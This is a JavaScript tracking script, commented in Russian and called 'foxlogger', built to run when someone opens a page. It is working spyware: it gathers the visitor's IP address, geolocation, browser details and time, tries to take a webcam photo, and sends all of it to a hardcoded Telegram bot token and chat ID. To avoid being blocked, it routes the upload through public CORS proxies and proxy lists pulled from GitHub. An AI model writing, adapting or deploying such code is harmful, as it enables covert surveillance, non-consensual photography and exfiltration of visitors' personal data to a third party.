// logger.js — С АВТООБНОВЛЯЕМЫМИ ПРОКСИ ИЗ GitHub
(async function() {
    "use strict";

    // ========== ТВОИ ДАННЫЕ ==========
    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
    const TELEGRAM_CHAT_ID = "8995427762";

    // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ РАБОЧИХ ПРОКСИ ==========
    async function getWorkingProxies() {
        // Список источников с прокси (обновляемые)
        const proxySources = [
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
        ];
        
        let allProxies = [];
        
        // Загружаем прокси из источников
        for (const source of proxySources) {
            try {
                const response = await fetch(source);
                const text = await response.text();
                const proxies = text.split('\n').filter(line => line.trim() && !line.startsWith('#'));
                allProxies.push(...proxies);
            } catch(e) {
                console.warn(`Не удалось загрузить прокси из ${source}`);
            }
        }
        
        // Фильтруем только HTTP/HTTPS прокси и добавляем к ним CORS
        const corsProxies = [
            "https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot",
            "https://api.allorigins.win/raw?url=https://api.telegram.org/bot",
            "https://corsproxy.io/?https://api.telegram.org/bot",
            "https://proxy.cors.sh/https://api.telegram.org/bot"
        ];
        
        // Добавляем найденные прокси в формате для Telegram API
        const telegramProxies = [];
        for (const proxy of allProxies.slice(0, 50)) {
            const proxyUrl = `https://cors-anywhere.herokuapp.com/https://${proxy}/bot`;
            telegramProxies.push(proxyUrl);
        }
        
        return [...corsProxies, ...telegramProxies];
    }

    // ========== 1. Сбор IP и геолокации ==========
    let ipAddress = "0.0.0.0";
    let country = "не определена";
    let region = "не определён";
    let city = "не определён";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        country = geoData.country_name || "не определена";
        region = geoData.region || "не определён";
        city = geoData.city || "не определён";
    } catch(e) {
        console.warn("Geo error:", e);
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent ПОЛНЫЙ ==========
    const fullUserAgent = navigator.userAgent;
    const language = navigator.language || "не определён";

    // ========== 4. Формирование сообщения ==========
    const message = `🚨 <b>Новый переход!</b>

<b>🌐 IP:</b> <code>${ipAddress}</code>
<b>├─ User-Agent:</b> <code>${fullUserAgent}</code>
<b>├─ Язык:</b> <code>${language}</code>
<b>└─ Время:</b> <code>${timeStr}</code>

<b>🌍 Геолокация:</b>
<b>├─ Страна:</b> <code>${country}</code>
<b>├─ Регион:</b> <code>${region}</code>
<b>└─ Город:</b> <code>${city}</code>`;

    // ========== 5. Захват фото ==========
    let photoBlob = null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
    }

    // ========== 6. Отправка через прокси ==========
    async function sendViaProxy(proxyUrl, blob, caption) {
        try {
            let url, options;
            
            if (blob) {
                url = `${proxyUrl}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "snapshot.jpg");
                formData.append("caption", caption);
                formData.append("parse_mode", "HTML");
                options = { method: "POST", body: formData };
            } else {
                url = `${proxyUrl}${TELEGRAM_BOT_TOKEN}/sendMessage`;
                options = {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: caption,
                        parse_mode: "HTML",
                        disable_web_page_preview: true
                    })
                };
            }
            
            const response = await fetch(url, options);
            const result = await response.json();
            return { success: result.ok, error: result.description };
        } catch(e) {
            return { success: false, error: e.message };
        }
    }

    // Получаем прокси и отправляем
    console.log("🔄 Загрузка списка прокси...");
    const proxies = await getWorkingProxies();
    console.log(`📋 Загружено ${proxies.length} прокси`);

    let sent = false;
    
    for (const proxy of proxies) {
        if (sent) break;
        console.log(`🔄 Пробуем прокси: ${proxy.substring(0, 60)}...`);
        
        if (photoBlob) {
            const result = await sendViaProxy(proxy, photoBlob, message);
            if (result.success) {
                console.log("✅ Фото и данные отправлены!");
                sent = true;
                break;
            }
        } else {
            const result = await sendViaProxy(proxy, null, message);
            if (result.success) {
                console.log("✅ Данные отправлены!");
                sent = true;
                break;
            }
        }
        await new Promise(r => setTimeout(r, 300));
    }
    
    if (!sent) {
        console.log("❌ Не удалось отправить данные");
        // Сохраняем локально
        try {
            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
            failed.push({ data: message, time: new Date().toISOString(), ip: ipAddress });
            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
        } catch(e) {}
    }
})();
